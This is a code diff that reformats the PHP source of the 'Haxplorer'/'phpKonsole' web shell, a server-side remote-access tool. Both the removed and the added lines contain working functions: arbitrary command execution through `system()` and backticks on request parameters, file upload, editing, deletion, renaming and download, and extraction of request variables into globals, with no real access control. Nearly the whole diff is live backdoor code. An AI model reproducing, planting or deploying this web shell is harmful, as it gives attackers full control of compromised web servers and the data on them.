+        echo "<tr><td class=\"silver border\">&nbsp;<strong>Server's PHP Version:&nbsp;&nbsp;</strong>&nbsp;</td><td>&nbsp;$PHPVer&nbsp;</td></tr>\n";
+    } else {
+        echo "<tr><td class=\"silver border\">&nbsp;<strong>Server's PHP Version:&nbsp;&nbsp;</strong>&nbsp;</td><td>&nbsp;$PHPVer (Some functions might be unavailable...)&nbsp;</td></tr>\n";
+    }
 
-		echo "</center></td></tr></table></td></tr>";
+    /* <!-- Other Actions --> */
 
-	}
+    echo "<tr><td class=\"silver border\">&nbsp;<strong>Other actions:&nbsp;&nbsp;</strong>&nbsp;</td>\n";
 
+    echo "<td>&nbsp;<b>".buildUrl("| New File |", "cmd=newfile&lastcmd=dir&lastdir=$dir")."\n".sp(3).
 
+                         buildUrl("| New Directory |", "cmd=newdir&lastcmd=dir&lastdir=$dir")."\n".sp(3).
 
+                 buildUrl("| Upload a File |", "cmd=upload&dir=$dir&lastcmd=dir&lastdir=$dir"). "</b>\n</td></tr>\n";
 
+    echo "<tr><td class=\"silver border\">&nbsp;<strong>Script Location:&nbsp;&nbsp;</strong>&nbsp;</td><td>&nbsp;$PATH_TRANSLATED</td></tr>\n";
 
-    	echo "</table>\n<br><table NOWRAP>";
+    echo "<tr><td class=\"silver border\">&nbsp;<strong>Your IP:&nbsp;&nbsp;</strong>&nbsp;</td><td>&nbsp;$REMOTE_ADDR&nbsp;</td></tr>\n";
 
+    echo "<tr><td class=\"silver border\">&nbsp;<strong>Browsing Directory:&nbsp;&nbsp;</strong></td><td>&nbsp;$partdir&nbsp;</td></tr>\n";
 
+    echo "<tr><td valign=\"top\" class=\"silver border\">&nbsp;<strong>Legend:&nbsp;&nbsp;</strong&nbsp;</td><td>\n";
 
-  	if ($isGoodver) {
+    echo "<table NOWRAP>";
 
-		echo "<tr><td class=\"silver border\">&nbsp;<strong>Server's PHP Version:&nbsp;&nbsp;</strong>&nbsp;</td><td>&nbsp;$PHPVer&nbsp;</td></tr>\n";
+    echo "<tr><td><strong>D:</strong></td><td>&nbsp;&nbsp;Directory.</td></tr>\n";
 
-	}
+    echo "<tr><td><strong>R:</strong></td><td>&nbsp;&nbsp;Readable.</td></tr>\n";
 
- 	else {
+    echo "<tr><td><strong>W:</strong></td><td>&nbsp;&nbsp;Writeable.</td></tr>\n";
 
-		echo "<tr><td class=\"silver border\">&nbsp;<strong>Server's PHP Version:&nbsp;&nbsp;</strong>&nbsp;</td><td>&nbsp;$PHPVer (Some functions might be unavailable...)&nbsp;</td></tr>\n";
+    echo "<tr><td><strong>X:</strong></td><td>&nbsp;&nbsp;Executable.</td></tr>\n";
 
-	}
+    echo "<tr><td><strong>U:</strong></td><td>&nbsp;&nbsp;HTTP Uploaded File.</td></tr>\n";
 
-      		/* <!-- Other Actions --> */
+    echo "</table></td>";
 
-   	echo "<tr><td class=\"silver border\">&nbsp;<strong>Other actions:&nbsp;&nbsp;</strong>&nbsp;</td>\n";
+    echo "</table>";
 
-  	echo "<td>&nbsp;<b>".buildUrl( "| New File |", "cmd=newfile&lastcmd=dir&lastdir=$dir")."\n".sp(3).
+    echo "<br>";
 
-	                     buildUrl( "| New Directory |", "cmd=newdir&lastcmd=dir&lastdir=$dir")."\n".sp(3).
-
-			     buildUrl( "| Upload a File |", "cmd=upload&dir=$dir&lastcmd=dir&lastdir=$dir"). "</b>\n</td></tr>\n";
-
-    	echo "<tr><td class=\"silver border\">&nbsp;<strong>Script Location:&nbsp;&nbsp;</strong>&nbsp;</td><td>&nbsp;$PATH_TRANSLATED</td></tr>\n";
-
-  	echo "<tr><td class=\"silver border\">&nbsp;<strong>Your IP:&nbsp;&nbsp;</strong>&nbsp;</td><td>&nbsp;$REMOTE_ADDR&nbsp;</td></tr>\n";
-
-  	echo "<tr><td class=\"silver border\">&nbsp;<strong>Browsing Directory:&nbsp;&nbsp;</strong></td><td>&nbsp;$partdir&nbsp;</td></tr>\n";
-
-  	echo "<tr><td valign=\"top\" class=\"silver border\">&nbsp;<strong>Legend:&nbsp;&nbsp;</strong&nbsp;</td><td>\n";
-
-  	echo "<table NOWRAP>";
-
-        echo "<tr><td><strong>D:</strong></td><td>&nbsp;&nbsp;Directory.</td></tr>\n";
-
-   	echo "<tr><td><strong>R:</strong></td><td>&nbsp;&nbsp;Readable.</td></tr>\n";
-
-  	echo "<tr><td><strong>W:</strong></td><td>&nbsp;&nbsp;Writeable.</td></tr>\n";
-
-  	echo "<tr><td><strong>X:</strong></td><td>&nbsp;&nbsp;Executable.</td></tr>\n";
-
-  	echo "<tr><td><strong>U:</strong></td><td>&nbsp;&nbsp;HTTP Uploaded File.</td></tr>\n";
-
-  	echo "</table></td>";
-
- 	echo "</table>";
-
- 	echo "<br>";
-
-     	@closedir($h);
-
-  }
-
-  elseif ( $cmd=="execute" ) {/*<!-- Execute the executable -->*/
-
- 	echo system("$file");
-
- }
-
-elseif ( $cmd=="deldir" ) { /*<!-- Delete a directory and all it's files --> */
-
-	echo "<center><table><tr><td NOWRAP>" ;
-
- 	if ($auth == "yes") {
-
-		if (Mydeldir($file)==false) {
-
- 			echo "Could not remove \"$file\"<br>Permission denied, or directory not empty...";
-
-  		}
-
- 		else {
-
- 			echo "Successfully removed \"$file\"<br>";
-
- 		}
-
- 		echo "<form action=\"$SFileName?$urlAdd\" method=\"POST\"><input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\"><input type=\"hidden\" name=\"dir\" value=\"$lastdir\"><input tabindex=\"0\" type=\"submit\" value=\"Back to Haxplorer\"></form>";
-
-	}
-
- 	else {
-
-		echo "Are you sure you want to delete \"$file\" and all it's subdirectories ?
+    @closedir($h);
+} elseif ($cmd=="execute") {/*<!-- Execute the executable -->*/
+
+      echo system("$file");
+  } elseif ($cmd=="deldir") { /*<!-- Delete a directory and all it's files --> */
+
+    echo "<center><table><tr><td NOWRAP>" ;
+
+    if ($auth == "yes") {
+        if (Mydeldir($file)==false) {
+            echo "Could not remove \"$file\"<br>Permission denied, or directory not empty...";
+        } else {
+            echo "Successfully removed \"$file\"<br>";
+        }
+
+        echo "<form action=\"$SFileName?$urlAdd\" method=\"POST\"><input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\"><input type=\"hidden\" name=\"dir\" value=\"$lastdir\"><input tabindex=\"0\" type=\"submit\" value=\"Back to Haxplorer\"></form>";
+    } else {
+        echo "Are you sure you want to delete \"$file\" and all it's subdirectories ?
 
         <form action=\"$SFileName?$urlAdd\" method=\"POST\">
 
@@ -1213,36 +1097,21 @@ elseif ( $cmd=="deldir" ) { /*<!-- Delete a directory and all it's files --> */
 	<input type=\"hidden\" name=\"dir\" value=\"$lastdir\">
 
 	<input tabindex=\"0\" type=\"submit\" value=\"NO!\"></form>";
+    }
 
-        }
+    echo "</td></tr></center>";
+} elseif ($cmd=="delfile") { /*<!-- Delete a file --> */	echo "<center><table><tr><td NOWRAP>" ;
 
- 	echo "</td></tr></center>";
+     if ($auth == "yes") {
+         if (@unlink($file)==false) {
+             echo "Could not remove \"$file\"<br>";
+         } else {
+             echo "Successfully removed \"$file\"<br>";
+         }
 
-}
-
- elseif ( $cmd=="delfile" ) { /*<!-- Delete a file --> */	echo "<center><table><tr><td NOWRAP>" ;
-
- 	if ($auth == "yes") {
-
-		if (@unlink($file)==false) {
-
- 			echo "Could not remove \"$file\"<br>";
-
-  		}
-
- 		else {
-
- 			echo "Successfully removed \"$file\"<br>";
-
- 		}
-
-		echo "<form action=\"$SFileName?$urlAdd\" method=\"POST\"><input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\"><input type=\"hidden\" name=\"dir\" value=\"$lastdir\"><input tabindex=\"0\" type=\"submit\" value=\"Back to Haxplorer\"></form>";
-
-        }
-
- 	else {
-
-       	echo "Are you sure you want to delete \"$file\" ?
+         echo "<form action=\"$SFileName?$urlAdd\" method=\"POST\"><input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\"><input type=\"hidden\" name=\"dir\" value=\"$lastdir\"><input tabindex=\"0\" type=\"submit\" value=\"Back to Haxplorer\"></form>";
+     } else {
+         echo "Are you sure you want to delete \"$file\" ?
 
       	<form action=\"$SFileName?$urlAdd\" method=\"POST\">
 
@@ -1267,34 +1136,28 @@ elseif ( $cmd=="deldir" ) { /*<!-- Delete a directory and all it's files --> */
 	<input type=\"hidden\" name=\"dir\" value=\"$lastdir\">
 
 	<input tabindex=\"0\" type=\"submit\" value=\"NO!\"></form>";
+     }
 
-        }
+     echo "</td></tr></center>";
+ } elseif ($cmd=="newfile") { /*<!-- Create new file with default name --> */
 
- 	echo "</td></tr></center>";
+    echo "<center><table><tr><td NOWRAP>";
 
-}
+    $i = 1;
 
-elseif ( $cmd=="newfile" ) { /*<!-- Create new file with default name --> */
+    while (file_exists("$lastdir/newfile$i.txt")) {
+        $i++;
+    }
 
-	echo "<center><table><tr><td NOWRAP>";
+    $file = fopen("$lastdir/newfile$i.txt", "w+");
 
- 	$i = 1;
+    if ($file == false) {
+        echo "Could not create the new file...<br>";
+    } else {
+        echo "Successfully created: \"$lastdir/newfile$i.txt\"<br>";
+    }
 
- 	while (file_exists("$lastdir/newfile$i.txt"))
-
- 		$i++;
-
- 	$file = fopen("$lastdir/newfile$i.txt", "w+");
-
- 	if ($file == false)
-
- 		echo "Could not create the new file...<br>";
-
- 	else
-
- 		echo "Successfully created: \"$lastdir/newfile$i.txt\"<br>";
-
- 		echo "
+    echo "
 
    			<form action=\"$SFileName?$urlAdd\" method=\"POST\">
 
@@ -1307,30 +1170,25 @@ elseif ( $cmd=="newfile" ) { /*<!-- Create new file with default name --> */
 			</form></center>
 
  			</td></tr></table></center>   		";
+} elseif ($cmd=="newdir") { /*<!-- Create new directory with default name --> */
 
-	}
+    echo "<center><table><tr><td NOWRAP>" ;
 
-elseif ( $cmd=="newdir" ) { /*<!-- Create new directory with default name --> */
+    $i = 1;
 
-	echo "<center><table><tr><td NOWRAP>" ;
+    while (is_dir("$lastdir/newdir$i")) {
+        $i++;
+    }
 
- 	$i = 1;
+    $file = mkdir("$lastdir/newdir$i", 0777);
 
- 	while (is_dir("$lastdir/newdir$i"))
+    if ($file == false) {
+        echo "Could not create the new directory...<br>";
+    } else {
+        echo "Successfully created: \"$lastdir/newdir$i\"<br>";
+    }
 
-  		$i++;
-
- 	$file = mkdir("$lastdir/newdir$i", 0777);
-
- 	if ($file == false)
-
- 		echo "Could not create the new directory...<br>";
-
- 	else
-
- 		echo "Successfully created: \"$lastdir/newdir$i\"<br>";
-
- 	echo "<form action=\"$SFileName?$urlAdd\" method=\"POST\">
+    echo "<form action=\"$SFileName?$urlAdd\" method=\"POST\">
 
 		<input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\">
 
@@ -1339,100 +1197,74 @@ elseif ( $cmd=="newdir" ) { /*<!-- Create new directory with default name --> */
 		<input tabindex=\"0\" type=\"submit\" value=\"Back to Haxplorer\">
 
 		</form></center></td></tr></table></center>";
+} elseif ($cmd=="edit") { /*<!-- Edit a file and save it afterwards with the saveedit block. --> */
 
-}
+    $contents = "";
 
-elseif ( $cmd=="edit" ) { /*<!-- Edit a file and save it afterwards with the saveedit block. --> */
+    $fc = @file($file);
 
-	$contents = "";
+    while (@list($ln, $line) = each($fc)) {
+        $contents .= htmlentities($line) ;
+    }
 
-	$fc = @file( $file );
+    echo "<br><center><table><tr><td NOWRAP>";
 
-  	while ( @list( $ln, $line ) = each( $fc ) ) {
+    echo "M<form action=\"$SFileName?$urlAdd\" method=\"post\">\n";
 
-  		$contents .= htmlentities( $line ) ;
+    echo "<input type=\"hidden\" name=\"cmd\" value=\"saveedit\">\n";
 
- 	}
+    echo "<strong>EDIT FILE: </strong>$file<br>\n";
 
- 	echo "<br><center><table><tr><td NOWRAP>";
+    echo "<textarea rows=\"25\" cols=\"95\" name=\"contents\">$contents</textarea><br>\n";
 
-	echo "M<form action=\"$SFileName?$urlAdd\" method=\"post\">\n";
+    echo "<input size=\"50\" type=\"text\" name=\"file\" value=\"$file\">\n";
 
-	echo "<input type=\"hidden\" name=\"cmd\" value=\"saveedit\">\n";
+    echo "<input type=\"submit\" value=\"Save\">";
 
-	echo "<strong>EDIT FILE: </strong>$file<br>\n";
+    echo "</form>";
 
-	echo "<textarea rows=\"25\" cols=\"95\" name=\"contents\">$contents</textarea><br>\n";
+    echo "</td></tr></table></center>";
+} elseif ($cmd=="saveedit") { /*<!-- Save the edited file back to a file --> */
 
-	echo "<input size=\"50\" type=\"text\" name=\"file\" value=\"$file\">\n";
+    $fo = fopen($file, "w");
 
-	echo "<input type=\"submit\" value=\"Save\">";
+    $wrret = fwrite($fo, stripslashes($contents));
 
-	echo "</form>";
+    $clret = fclose($fo);
+} elseif ($cmd=="downl") { /*<!-- Save the edited file back to a file --> */
 
-	echo "</td></tr></table></center>";
+    $downloadfile = urldecode($file);
 
-}
+    if (function_exists("basename")) {
+        $downloadto = basename($downloadfile);
+    } else {
+        $downloadto = "download.ext";
+    }
 
-elseif ( $cmd=="saveedit" ) { /*<!-- Save the edited file back to a file --> */
+    if (!file_exists("$downloadfile")) {
+        echo "The file does not exist";
+    } else {
+        $size = @filesize("$downloadfile");
 
-	$fo = fopen($file, "w");
+        if ($size != false) {
+            $add="; size=$size";
+        } else {
+            $add="";
+        }
 
-	$wrret = fwrite($fo, stripslashes($contents));
+        header("Content-Type: application/download");
 
-	$clret = fclose($fo);
+        header("Content-Disposition: attachment; filename=$downloadto$add");
 
-}
+        $fp=fopen("$downloadfile", "rb");
 
-elseif ( $cmd=="downl" ) { /*<!-- Save the edited file back to a file --> */
+        fpassthru($fp);
 
-	$downloadfile = urldecode($file);
+        flush();
+    }
+} elseif ($cmd=="upload") { /* <!-- Upload File form --> */
 
-	if (function_exists("basename"))
-
-    		$downloadto = basename ($downloadfile);
-
-	else
-
-		$downloadto = "download.ext";
-
-	if (!file_exists("$downloadfile"))
-
-		echo "The file does not exist";
-
-	else {
-
-		$size = @filesize("$downloadfile");
-
-		if ($size != false) {
-
-			$add="; size=$size";
-
-		}			
-
-		else {
-
-			$add="";
-
-		}
-
- 		header("Content-Type: application/download");
-
-		header("Content-Disposition: attachment; filename=$downloadto$add");
-
-		$fp=fopen("$downloadfile" ,"rb");
-
-		fpassthru($fp);
-
-		flush();
-
-	}
-
-}
-
-elseif ( $cmd=="upload" ) { /* <!-- Upload File form --> */ 
-
-   	?>
+    ?>
 
 	<center>
 
@@ -1492,169 +1324,110 @@ elseif ( $cmd=="upload" ) { /* <!-- Upload File form --> */
 
  	<?php
 
-}
+} elseif ($cmd=="uploadproc") { /* <!-- Process Uploaded file --> */
 
-elseif ( $cmd=="uploadproc" ) { /* <!-- Process Uploaded file --> */
+    echo "<center><table><tr><td NOWRAP>";
 
-	echo "<center><table><tr><td NOWRAP>";
+    if (file_exists($userfile)) {
+        $res = copy($userfile, "$dir/$userfile_name");
+    }
 
-	if (file_exists($userfile))
+    echo "Uploaded \"$userfile_name\" to \"$userfile\"; <br>\n";
 
-		$res = copy($userfile, "$dir/$userfile_name");
+    if ($res) {
+        echo "Successfully moved \"$userfile\" to \"$dir/$userfile_name\".\n<br><br>";
 
-	echo "Uploaded \"$userfile_name\" to \"$userfile\"; <br>\n";
+        echo "Local filename: \"$userfile_name\".\n<br>Remote filename: \"$userfile\".\n<br>";
 
-     	if ($res) {
+        echo "Filesize: ".formatsize($userfile_size).".\n<br>Filetype: $userfile_type.\n<br>";
+    } else {
+        echo "Could not move uploaded file; Action aborted...";
+    }
 
-		echo "Successfully moved \"$userfile\" to \"$dir/$userfile_name\".\n<br><br>";
+    echo "<form action=\"$SFileName?$urlAdd\" method=\"POST\"><input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\"><input type=\"hidden\" name=\"dir\" value=\"$lastdir\"><input tabindex=\"0\" type=\"submit\" value=\"Back to Haxplorer\"></form></center>" ;
 
-		echo "Local filename: \"$userfile_name\".\n<br>Remote filename: \"$userfile\".\n<br>";
+    echo "<br><br></td></tr></table></center>";
+} elseif ($cmd=="file") { /* <!-- View a file in text --> */
 
-		echo "Filesize: ".formatsize($userfile_size).".\n<br>Filetype: $userfile_type.\n<br>";
+    echo "<hr>";
 
-	}
+    $fc = @file($file);
+    while (@list($ln, $line) = each($fc)) {
+        echo spacetonbsp(@htmlentities($line))."<br>\n";
+    }
 
-	else {
+    echo "<hr>";
+} elseif ($cmd=="ren") { /* <!-- File and Directory Rename --> */
 
-		echo "Could not move uploaded file; Action aborted...";
+    if (function_exists('is_dir')) {
+        if (is_dir("$oldfile")) {
+            $objname = "Directory";
 
-	}
+            $objident = "Directory";
+        } else {
+            $objname = "Filename";
 
-	echo "<form action=\"$SFileName?$urlAdd\" method=\"POST\"><input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\"><input type=\"hidden\" name=\"dir\" value=\"$lastdir\"><input tabindex=\"0\" type=\"submit\" value=\"Back to Haxplorer\"></form></center>" ;
+            $objident = "file";
+        }
+    }
 
-	echo "<br><br></td></tr></table></center>";
+    echo "<table width=100% border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr><td width=100% style=\"class=\"silver border\"><center>&nbsp;Rename a file:&nbsp;</center></td></tr></table><br>\n";
 
-}
+    if (empty($newfile) != true) {
+        echo "<center>";
 
-elseif ( $cmd=="file" ) { /* <!-- View a file in text --> */
+        $return = @rename($oldfile, "$olddir$newfile");
 
-        echo "<hr>"; 
+        if ($return) {
+            echo "$objident renamed successfully:<br><br>Old $objname: \"$oldfile\".<br>New $objname: \"$olddir$newfile\"";
+        } else {
+            if (@file_exists("$olddir$newfile")) {
+                echo "Error: The $objident does already exist...<br><br>\"$olddir$newfile\"<br><br>Hit your browser's back to try again...";
+            } else {
+                echo "Error: Can't copy the file, the file could be in use or you don't have permission to rename it.";
+            }
+        }
 
-	$fc = @file( $file );  	while ( @list( $ln, $line ) = each( $fc ) ) {
+        echo "<form action=\"$SFileName?$urlAdd\" method=\"POST\"><input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\"><input type=\"hidden\" name=\"dir\" value=\"$lastdir\"><input tabindex=\"0\" type=\"submit\" value=\"Back to Haxplorer\"></form></center>" ;
+    } else {
+        $dpos = strrpos($oldfile, "/");
 
-  		echo spacetonbsp(@htmlentities($line))."<br>\n";
+        if (strval($dpos)!="") {
+            $olddir = substr($oldfile, 0, $dpos+1);
+        } else {
+            $olddir = "$lastdir/";
+        }
 
-  	}
+        $fpos = strrpos($oldfile, "/");
 
-	echo "<hr>";
+        if (strval($fpos)!="") {
+            $inputfile = substr($oldfile, $fpos+1);
+        } else {
+            $inputfile = "";
+        }
 
-}
+        echo "<center><table><tr><td><form action=\"$SFileName?$urlAdd\" method=\"post\">\n";
 
-elseif ( $cmd=="ren" ) { /* <!-- File and Directory Rename --> */
+        echo "<input type=\"hidden\" name=\"cmd\" value=\"ren\">\n";
 
-     	if (function_exists('is_dir')) {
+        echo "<input type=\"hidden\" name=\"oldfile\" value=\"$oldfile\">\n";
 
- 		if (is_dir("$oldfile")) {
+        echo "<input type=\"hidden\" name=\"olddir\" value=\"$olddir\">\n";
 
- 			$objname = "Directory";
+        echo "<input type=\"hidden\" name=\"lastcmd\" value=\"$lastcmd\">\n";
 
- 			$objident = "Directory";
+        echo "<input type=\"hidden\" name=\"lastdir\" value=\"$lastdir\">\n";
 
-  		}
+        echo "Rename \"$oldfile\" to:<br>\n";
 
- 		else {
+        echo "<input size=\"100\" type=\"text\" name=\"newfile\" value=\"$inputfile\"><br><input type=\"submit\" value=\"Rename\">";
 
- 			$objname = "Filename";
+        echo "</form><form action=\"$SFileName?$urlAdd\" method=\"post\"><input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\"><input type=\"hidden\" name=\"dir\" value=\"$lastdir\"><input type=\"submit\" value=\"Cancel\"></form>";
 
- 			$objident = "file";
-
- 		}
-
- 	}
-
-   	echo "<table width=100% border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr><td width=100% style=\"class=\"silver border\"><center>&nbsp;Rename a file:&nbsp;</center></td></tr></table><br>\n";
-
-	If (empty($newfile) != true) {
-
- 		echo "<center>";
-
-	 	$return = @rename($oldfile, "$olddir$newfile");
-
-		if ($return) {
-
- 			echo "$objident renamed successfully:<br><br>Old $objname: \"$oldfile\".<br>New $objname: \"$olddir$newfile\"";
-
- 		}
-
- 		else {
-
- 			if ( @file_exists("$olddir$newfile") ) {
-
- 				echo "Error: The $objident does already exist...<br><br>\"$olddir$newfile\"<br><br>Hit your browser's back to try again...";
-
- 			}
-
- 			else {
-
- 				echo "Error: Can't copy the file, the file could be in use or you don't have permission to rename it.";
-
- 			}
-
-  		}
-
- 		echo "<form action=\"$SFileName?$urlAdd\" method=\"POST\"><input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\"><input type=\"hidden\" name=\"dir\" value=\"$lastdir\"><input tabindex=\"0\" type=\"submit\" value=\"Back to Haxplorer\"></form></center>" ;
-
- 	}
-
- 	else {
-
- 		$dpos = strrpos($oldfile, "/");
-
- 		if (strval($dpos)!="") {
-
- 			$olddir = substr($oldfile, 0, $dpos+1);
-
-   		}
-
- 		else {
-
- 			$olddir = "$lastdir/";
-
-		}
-
- 		$fpos = strrpos($oldfile, "/");
-
- 		if (strval($fpos)!="") {
-
- 			$inputfile = substr($oldfile, $fpos+1);
-
-   		}
-
- 		else {
-
-	 		$inputfile = "";
-
- 		}
-
-       		echo "<center><table><tr><td><form action=\"$SFileName?$urlAdd\" method=\"post\">\n";
-
- 		echo "<input type=\"hidden\" name=\"cmd\" value=\"ren\">\n";
-
- 		echo "<input type=\"hidden\" name=\"oldfile\" value=\"$oldfile\">\n";
-
- 		echo "<input type=\"hidden\" name=\"olddir\" value=\"$olddir\">\n";
-
- 		echo "<input type=\"hidden\" name=\"lastcmd\" value=\"$lastcmd\">\n";
-
- 		echo "<input type=\"hidden\" name=\"lastdir\" value=\"$lastdir\">\n";
-
- 		echo "Rename \"$oldfile\" to:<br>\n";
-
- 		echo "<input size=\"100\" type=\"text\" name=\"newfile\" value=\"$inputfile\"><br><input type=\"submit\" value=\"Rename\">"; 
-
-		echo "</form><form action=\"$SFileName?$urlAdd\" method=\"post\"><input type=\"hidden\" name=\"cmd\" value=\"$lastcmd\"><input type=\"hidden\" name=\"dir\" value=\"$lastdir\"><input type=\"submit\" value=\"Cancel\"></form>";
-
- 		echo "</td></tr></table></center>";
-
- 	}
-
-}
-
-else if ( $cmd == "con") {
-
-
-
-?>
+        echo "</td></tr></table></center>";
+    }
+} elseif ($cmd == "con") {
+    ?>
 
 <center>
 
@@ -1671,66 +1444,48 @@ else if ( $cmd == "con") {
 
 
 if (ini_get('register_globals') != '1') {
-
-    if (!empty($HTTP_POST_VARS))
-
-	extract($HTTP_POST_VARS);
-
-	  
-
-    if (!empty($HTTP_GET_VARS))
-
-	extract($HTTP_GET_VARS);
-
-	      
-
-    if (!empty($HTTP_SERVER_VARS))
-
-	extract($HTTP_SERVER_VARS);
-
+    if (!empty($HTTP_POST_VARS)) {
+        extract($HTTP_POST_VARS);
     }
 
-		    
+      
+
+    if (!empty($HTTP_GET_VARS)) {
+        extract($HTTP_GET_VARS);
+    }
+
+          
+
+    if (!empty($HTTP_SERVER_VARS)) {
+        extract($HTTP_SERVER_VARS);
+    }
+}
+
+            
 
     if (!empty($work_dir)) {
+        if (!empty($command)) {
+            if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $command, $regs)) {
+                if ($regs[1][0] == '/') {
+                    $new_dir = $regs[1];
+                } else {
+                    $new_dir = $work_dir . '/' . $regs[1];
+                }
 
-	if (!empty($command)) {
+                if (file_exists($new_dir) && is_dir($new_dir)) {
+                    $work_dir = $new_dir;
+                }
 
-	    if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $command, $regs)) {
-
-	        if ($regs[1][0] == '/') {
-
-	            $new_dir = $regs[1];
-
-		} else {
-
-		    $new_dir = $work_dir . '/' . $regs[1];
-
-		}
-
-		if (file_exists($new_dir) && is_dir($new_dir)) {
-
-		    $work_dir = $new_dir;
-
-		}
-
-		unset($command);
-
-	    }
-
-	}
-
+                unset($command);
+            }
+        }
     }
 
     if (file_exists($work_dir) && is_dir($work_dir)) {
-
-	chdir($work_dir);
-
+        chdir($work_dir);
     }
 
-    $work_dir = exec('pwd');
-
-?>
+    $work_dir = exec('pwd'); ?>
 
 
 
@@ -1742,25 +1497,19 @@ if (ini_get('register_globals') != '1') {
 
 	<?php
 
-	    $work_dir_splitted = explode('/', substr($work_dir, 1));
+        $work_dir_splitted = explode('/', substr($work_dir, 1));
 
-	    printf('<a href="%s?$urlAddcmd=con&stderr=%s&work_dir=/">Root</a>/', $PHP_SELF, $stderr);
+    printf('<a href="%s?$urlAddcmd=con&stderr=%s&work_dir=/">Root</a>/', $PHP_SELF, $stderr);
 
-	    if (!empty($work_dir_splitted[0])) {
+    if (!empty($work_dir_splitted[0])) {
+        $path = '';
 
-		$path = '';
+        for ($i = 0; $i < count($work_dir_splitted); $i++) {
+            $path .= '/' . $work_dir_splitted[$i];
 
-		for ($i = 0; $i < count($work_dir_splitted); $i++) {
-
-		    $path .= '/' . $work_dir_splitted[$i];
-
-		    printf('<a href="%s?$urlAddcmd=con&stderr=%s&work_dir=%s">%s</a>/', $PHP_SELF, $stderr, urlencode($path), $work_dir_splitted[$i]);
-
-		}
-
-	    }
-
-	?></b></td>
+            printf('<a href="%s?$urlAddcmd=con&stderr=%s&work_dir=%s">%s</a>/', $PHP_SELF, $stderr, urlencode($path), $work_dir_splitted[$i]);
+        }
+    } ?></b></td>
 
 	<td align="right">Choose new working directory: <select class="inputtext" name="work_dir" onChange="this.form.submit()">
 
@@ -1768,53 +1517,30 @@ if (ini_get('register_globals') != '1') {
 
 	<?php
 
-	$dir_handle = opendir($work_dir);
+    $dir_handle = opendir($work_dir);
 
-	while ($dir = readdir($dir_handle)) {
+    while ($dir = readdir($dir_handle)) {
+        if (is_dir($dir)) {
+            if ($dir == '.') {
+                echo "<option value=\"$work_dir\" selected>Current Directory</option>\n";
+            } elseif ($dir == '..') {
+                if (strlen($work_dir) == 1) {
+                } elseif (strrpos($work_dir, '/') == 0) {
+                    echo "<option value=\"/\">Parent Directory</option>\n";
+                } else {
+                    echo "<option value=\"". strrev(substr(strstr(strrev($work_dir), "/"), 1)) ."\">Parent Directory</option>\n";
+                }
+            } else {
+                if ($work_dir == '/') {
+                    echo "<option value=\"$work_dir$dir\">$dir</option>\n";
+                } else {
+                    echo "<option value=\"$work_dir/$dir\">$dir</option>\n";
+                }
+            }
+        }
+    }
 
-	    if (is_dir($dir)) {
-
-		if ($dir == '.') {
-
-		    echo "<option value=\"$work_dir\" selected>Current Directory</option>\n";
-
-		} elseif ($dir == '..') {
-
-		    if (strlen($work_dir) == 1) {
-
-		    }
-
-		    elseif (strrpos($work_dir, '/') == 0) {
-
-			echo "<option value=\"/\">Parent Directory</option>\n";
-
-		    } else {
-
-			echo "<option value=\"". strrev(substr(strstr(strrev($work_dir), "/"), 1)) ."\">Parent Directory</option>\n";
-
-		    }
-
-		} else {
-
-		    if ($work_dir == '/') {
-
-			echo "<option value=\"$work_dir$dir\">$dir</option>\n";
-
-		    } else {
-
-			echo "<option value=\"$work_dir/$dir\">$dir</option>\n";
-
-		    }
-
-		}
-
-	    }
-
-	}
-
-	closedir($dir_handle);
-
-	?>
+    closedir($dir_handle); ?>
 
 	</select></td></tr></table>
 
@@ -1822,33 +1548,27 @@ if (ini_get('register_globals') != '1') {
 
 	<input name="submit_btn" class="inputbutton" type="submit" value="Execute Command"></p>
 
-	<p>Enable <code>stderr</code>-trapping? <input type="checkbox" name="stderr"<?php if (($stderr) || (!isset($stderr)) ) echo " CHECKED"; ?>></p>
+	<p>Enable <code>stderr</code>-trapping? <input type="checkbox" name="stderr"<?php if (($stderr) || (!isset($stderr))) {
+        echo " CHECKED";
+    } ?>></p>
 
 	<textarea cols="80" rows="19" class="inputtextarea" wrap=off readonly><?php
 
-	    if (!empty($command)) {
+        if (!empty($command)) {
+            echo "phpKonsole> ". htmlspecialchars($command) . "\n\n";
 
-	        echo "phpKonsole> ". htmlspecialchars($command) . "\n\n"; 
+            if ($stderr) {
+                $tmpfile = tempnam('/tmp', 'phpshell');
 
-		if ($stderr) {
+                $command .= " 1> $tmpfile 2>&1; " . "cat $tmpfile; rm $tmpfile";
+            } elseif ($command == 'ls') {
+                $command .= ' -F';
+            }
 
-		    $tmpfile = tempnam('/tmp', 'phpshell');
+            $output = `$command`;
 
-		    $command .= " 1> $tmpfile 2>&1; " . "cat $tmpfile; rm $tmpfile";
-
-		} else if ($command == 'ls') {
-
-		    $command .= ' -F';
-
-		}
-
-		$output = `$command`;
-
-		echo htmlspecialchars($output);
-
-	    }
-
-	?></textarea>
+            echo htmlspecialchars($output);
+        } ?></textarea>
 
     </form>
 
@@ -1863,14 +1583,9 @@ if (ini_get('register_globals') != '1') {
  </td></tr></table>
 
 <?php
+} else { /* <!-- There is a incorrect or no parameter specified... Let's open the main menu --> */
 
-}    
-
-else { /* <!-- There is a incorrect or no parameter specified... Let's open the main menu --> */
-
-	$isMainMenu = true;
-
-     ?>
+    $isMainMenu = true; ?>
 
 	<table width="100%" border="0" cellpadding="0" cellspacing="0">
 
@@ -1896,7 +1611,7 @@ else { /* <!-- There is a incorrect or no parameter specified... Let's open the 
 
 	  <td valign="top" class="silver border">
 
-           <?php echo buildUrl( sp(2)."<font color=\"navy\"><strong>==> Haxplorer <==</strong></font>", "cmd=dir&dir=.").sp(2); ?>
+           <?php echo buildUrl(sp(2)."<font color=\"navy\"><strong>==> Haxplorer <==</strong></font>", "cmd=dir&dir=.").sp(2); ?>
 
 	  </td>
 
